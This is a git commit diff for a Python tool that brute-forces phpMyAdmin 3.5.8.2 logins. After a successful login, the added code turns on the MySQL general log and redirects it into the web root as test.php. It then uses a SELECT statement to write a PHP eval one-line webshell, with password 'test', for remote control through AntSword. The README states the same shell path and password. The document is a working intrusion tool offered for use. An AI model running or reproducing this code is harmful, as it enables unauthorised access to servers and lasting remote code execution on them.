03bd56e3add4c2f9bb9a960d607a324f89483d24
freedom-wy <dazhuang_python@sina.com>
2021-01-20 13:26:24 +0800

    phpmyadmin密码爆破并写入一句话木马v1

--- README.md
+++ README.md
@@ -1,2 +1,9 @@
 # w_buggy
 phpmyadmin密码爆破并利用mysql日志写一句话shell
+
+# 
+#### 支持phpmyadmin版本
+Version 3.5.8.2
+
+#### 一句话木马路径
+当前默认为www目录下的test.php,密码默认为test,使用蚁剑连接
--- w_buggy_main.py
+++ w_buggy_main.py
@@ -24,11 +24,15 @@ async def read_file(filename, queue):
                 queue.append(line)
 
 
-def handle_request(session, url, method, **kwargs):
+def handle_request(session, url, method, data=None, **kwargs):
     """处理请求"""
     header = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
     }
+    # if kwargs.get("header"):
+    #     header.update(
+    #         kwargs.get("header")
+    #     )
     if method == "GET":
         try:
             response = session.get(url=url, headers=header, timeout=(10, 10))
@@ -37,13 +41,6 @@ def handle_request(session, url, method, **kwargs):
         else:
             return response
     elif method == "POST":
-        data = {
-            "pma_username": kwargs.get("username"),
-            "pma_password": kwargs.get("password"),
-            "server": "1",
-            "lang": "zh_CN",
-            "token": kwargs.get("token")
-        }
         try:
             response = session.post(url=url, headers=header, data=data, allow_redirects=False, timeout=(10, 10))
             return response
@@ -58,6 +55,7 @@ def phpmyadmin_crack(host, username, password):
     # 第一次请求获取token
     first_response = handle_request(session=session, url=url, method="GET")
     if not first_response:
+        print("获取token失败")
         return
     if first_response.status_code == 200 and first_response:
         # 获取token
@@ -72,11 +70,16 @@ def phpmyadmin_crack(host, username, password):
             login_url = host + "/phpmyadmin/index.php"
             # print("爆破账号:{user},爆破密码:{password}".format(user=username, password=password))
             # 第二次请求登录
-            second_response = handle_request(session=session, url=login_url, method="POST",
-                                             username=username,
-                                             password=password,
-                                             token=token_value)
+            login_data = {
+                "pma_username": username,
+                "pma_password": password,
+                "server": "1",
+                "lang": "zh_CN",
+                "token": token_value
+            }
+            second_response = handle_request(session=session, url=login_url, method="POST", data=login_data)
             if not second_response:
+                print("登录失败")
                 return
             if second_response.status_code != 302:
                 return
@@ -89,7 +92,68 @@ def phpmyadmin_crack(host, username, password):
                 if index_response.status_code == 200 and index_response:
                     if "常规设置" in index_response.text:
                         print("登录成功:用户名为{u},密码为{p}".format(u=username, p=password))
-                        return True
+                        sql_data = {
+                            "is_js_confirmed": 0,
+                            "token": token_value,
+                            "pos": 0,
+                            "goto": "server_sql.php",
+                            "message_to_show": "您的 SQL 语句已成功运行",
+                            "prev_sql_query": "",
+                            "sql_query": "",
+                            "sql_delimiter": ";",
+                            "show_query": 1,
+                            "ajax_request": "true"
+
+                        }
+                        # 设置日志开启
+                        sql_data.update(
+                            {
+                                "sql_query": "set global general_log='on';"
+                            }
+                        )
+                        sql_url = host + "/phpmyadmin/import.php"
+                        sql_log_on_response = handle_request(session=session, url=sql_url, method="POST", data=sql_data)
+                        sql_log_on = sql_log_on_response.json()
+                        if sql_log_on.get("success"):
+                            print("日志开关已打开")
+                        else:
+                            print("日志开关打开失败")
+                            return
+                        # 设置日志路径
+                        trojan_file = "test.php"
+                        path = "C:/phpStudy/WWW/{}".format(trojan_file)
+                        sql_data.update(
+                            {
+                                "sql_query": "set global general_log_file = '{}';".format(path)
+                            }
+                        )
+                        sql_log_path_response = handle_request(session=session, url=sql_url, method="POST",
+                                                               data=sql_data)
+                        sql_log_path = sql_log_path_response.json()
+                        if sql_log_path.get("success"):
+                            print("日志路径设置成功")
+                        else:
+                            print("日志路径设置失败")
+                            return
+                        # 写入一句话木马
+                        sql_data.update(
+                            {
+                                "sql_query": """select '<?php eval($_POST["test"]);?>'"""
+                            }
+                        )
+                        print("开始写入一句话木马")
+                        # header = {
+                        #     "referer": host + "/phpmyadmin/server_sql.php?token={}".format(token_value)
+                        # }
+                        trojan_response = handle_request(session=session, url=sql_url, method="POST", data=sql_data)
+                        if trojan_response:
+                            if trojan_response.status_code == 200:
+                                print("一句话木马路径: {},密码test,请使用蚁剑连接".format(host + "/" + trojan_file))
+                                return True
+                        # # 查询sql日志状态
+                        #     "sql_query": "show global variables like '%genera%';",
+                        # sql_state_response = handle_request(session=session, url=sql_state_url, method="POST", data=sql_state_data)
+                        # print(sql_state_response.text)
                     else:
                         return False
                 else:
@@ -116,6 +180,8 @@ def main(host, max_workers):
             for data in as_completed(handle_phpmyadmin):
                 if data.result():
                     return
+    # 测试
+    # phpmyadmin_crack(host=host, username="root", password="root")
 
 
 if __name__ == '__main__':
